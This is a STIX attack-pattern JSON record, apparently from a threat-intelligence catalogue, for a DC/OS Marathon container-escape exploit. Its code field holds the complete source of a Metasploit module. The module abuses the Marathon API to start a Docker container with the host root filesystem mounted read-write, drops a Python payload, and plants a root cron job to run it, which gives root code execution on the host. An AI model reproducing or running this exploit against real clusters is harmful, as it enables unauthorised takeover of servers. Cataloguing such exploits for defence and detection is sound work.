{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4a477479-eec6-4a2c-bf51-0fecc9a82cf1",
    "created": "2024-08-14T17:00:40.543721Z",
    "modified": "2024-08-14T17:00:40.543726Z",
    "name": "DC/OS Marathon UI Docker Exploit",
    "description": " Utilizing the DCOS Cluster's Marathon UI, an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container. As the docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owed by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server.  *Notes: The docker image must be a valid docker image from hub.docker.com. Furthermore the docker container will only deploy if there are resources available in the DC/OS cluster. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dcos_marathon.rb",
            "external_id": "dcos_marathon.rb"
        },
        {
            "source_name": "reference",
            "url": "https://warroom.securestate.com/dcos-marathon-compromise/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DC/OS Marathon UI Docker Exploit',\n      'Description'    => %q{\n        Utilizing the DCOS Cluster's Marathon UI, an attacker can create\n        a docker container with the '/' path mounted with read/write\n        permissions on the host server that is running the docker container.\n        As the docker container executes command as uid 0 it is honored\n        by the host operating system allowing the attacker to edit/create\n        files owed by root. This exploit abuses this to creates a cron job\n        in the '/etc/cron.d/' path of the host server.\n\n        *Notes: The docker image must be a valid docker image from\n        hub.docker.com. Furthermore the docker container will only\n        deploy if there are resources available in the DC/OS cluster.\n      },\n      'Author'         => 'Erik Daguerre',\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'URL', 'https://warroom.securestate.com/dcos-marathon-compromise/'],\n      ],\n      'Targets'            => [\n        [ 'Python', {\n            'Platform'   => 'python',\n            'Arch'       => ARCH_PYTHON,\n            'Payload'    => {\n              'Compat'   => {\n                'ConnectionType' => 'reverse noconn none tunnel'\n              }\n            }\n          }\n        ]\n      ],\n      'DefaultOptions' => { 'WfsDelay' => 75 },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2017-03-03'))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ true, 'Post path to start docker', '/v2/apps' ]),\n        OptString.new('DOCKERIMAGE', [ true, 'hub.docker.com image to use', 'python:3-slim' ]),\n        OptString.new('CONTAINER_ID', [ false, 'container id you would like']),\n        OptInt.new('WAIT_TIMEOUT', [ true, 'Time in seconds to wait for the docker container to deploy', 60 ])\n      ])\n  end\n\n  def get_apps\n    res = send_request_raw({\n      'method'  => 'GET',\n      'uri'     => target_uri.path\n    })\n    return unless res and res.code == 200\n\n    # verify it is marathon ui, and is returning content-type json\n    return unless res.headers.to_json.include? 'Marathon' and res.headers['Content-Type'].include? 'application/json'\n    apps = JSON.parse(res.body)\n\n    apps\n  end\n\n  def del_container(container_id)\n    res = send_request_raw({\n      'method'  => 'DELETE',\n      'uri'     => normalize_uri(target_uri.path, container_id)\n    })\n    return unless res and res.code == 200\n\n    res.code\n  end\n\n  def make_container_id\n    return datastore['CONTAINER_ID'] unless datastore['CONTAINER_ID'].nil?\n\n    rand_text_alpha_lower(8)\n  end\n\n  def make_cmd(mnt_path, cron_path, payload_path)\n    vprint_status('Creating the docker container command')\n    payload_data = nil\n    echo_cron_path = mnt_path + cron_path\n    echo_payload_path = mnt_path + payload_path\n\n    cron_command = \"python #{payload_path}\"\n    payload_data = payload.raw\n\n    command = \"echo \\\"#{payload_data}\\\" >> #{echo_payload_path}\\n\"\n    command << \"echo \\\"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin\\\" >> #{echo_cron_path}\\n\"\n    command << \"echo \\\"\\\" >> #{echo_cron_path}\\n\"\n    command << \"echo \\\"* * * * * root #{cron_command}\\\" >> #{echo_cron_path}\\n\"\n    command << \"sleep 120\"\n\n    command\n  end\n\n  def make_container(mnt_path, cron_path, payload_path, container_id)\n    vprint_status('Setting container json request variables')\n    container_data = {\n      'cmd'                 => make_cmd(mnt_path, cron_path, payload_path),\n      'cpus'                => 1,\n      'mem'                 => 128,\n      'disk'                => 0,\n      'instances'           => 1,\n      'id'                  => container_id,\n      'container'           => {\n        'docker'            => {\n          'image'           => datastore['DOCKERIMAGE'],\n          'network'         => 'HOST',\n        },\n        'type'              => 'DOCKER',\n        'volumes'           => [\n          {\n            'hostPath'      => '/',\n            'containerPath' => mnt_path,\n            'mode'          => 'RW'\n          }\n        ],\n      },\n      'env'                 => {},\n      'labels'              => {}\n    }\n\n    container_data\n  end\n\n  def check\n    return Exploit::CheckCode::Safe if get_apps.nil?\n\n    Exploit::CheckCode::Appears\n  end\n\n  def exploit\n    if get_apps.nil?\n      fail_with(Failure::Unknown, 'Failed to connect to the targeturi')\n    end\n    # create required information to create json container information.\n    cron_path = '/etc/cron.d/' + rand_text_alpha(8)\n    payload_path = '/tmp/' + rand_text_alpha(8)\n    mnt_path = '/mnt/' + rand_text_alpha(8)\n    container_id = make_container_id()\n\n    res = send_request_raw({\n      'method'  => 'POST',\n      'uri'     => target_uri.path,\n      'data'    => make_container(mnt_path, cron_path, payload_path, container_id).to_json\n    })\n    fail_with(Failure::Unknown, 'Failed to create the docker container') unless res and res.code == 201\n\n    print_status('The docker container is created, waiting for it to deploy')\n    register_files_for_cleanup(cron_path, payload_path)\n    sleep_time = 5\n    wait_time = datastore['WAIT_TIMEOUT']\n    deleted_container = false\n    print_status(\"Waiting up to #{wait_time} seconds for docker container to start\")\n\n    while wait_time > 0\n      sleep(sleep_time)\n      wait_time -= sleep_time\n      apps_status = get_apps\n      fail_with(Failure::Unknown, 'No apps returned') unless apps_status\n\n      apps_status['apps'].each do |app|\n        next if app['id'] != \"/#{container_id}\"\n\n        if app['tasksRunning'] == 1\n          print_status('The docker container is running, removing it')\n          del_container(container_id)\n          deleted_container = true\n          wait_time = 0\n        else\n          vprint_status('The docker container is not yet running')\n        end\n        break\n      end\n    end\n\n    # If the docker container does not deploy remove it and fail out.\n    unless deleted_container\n      del_container(container_id)\n      fail_with(Failure::Unknown, \"The docker container failed to start\")\n    end\n    print_status('Waiting for the cron job to run, can take up to 60 seconds')\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-03",
    "x_mitre_platforms": [
        "python'"
    ]
}